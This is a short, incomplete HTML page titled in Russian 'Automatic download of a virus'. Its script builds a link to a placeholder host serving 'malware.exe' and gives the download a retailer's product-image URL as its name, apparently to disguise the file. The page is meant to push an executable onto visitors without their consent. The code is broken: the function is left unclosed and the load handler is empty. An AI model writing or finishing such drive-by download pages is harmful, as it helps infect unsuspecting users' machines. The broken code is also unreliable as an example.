<!DOCTYPE html>
<html>
<head>
  <title>Автоматическое скачивание вируса</title>
  <script>
    function automaticDownload() {
      var link = document.createElement('a');
      link.href = 'http://virus-url/malware.exe'; 
      link.download = 'https://cdn.comfy.ua/media/catalog/product/cache/5/image/600x/9df78eab33525d08d6e5fb8d27136e95/1/4/1400_gallery_1712819831892028_0.jpg';

    window.onload = function() {

    };
  </script>
</head>
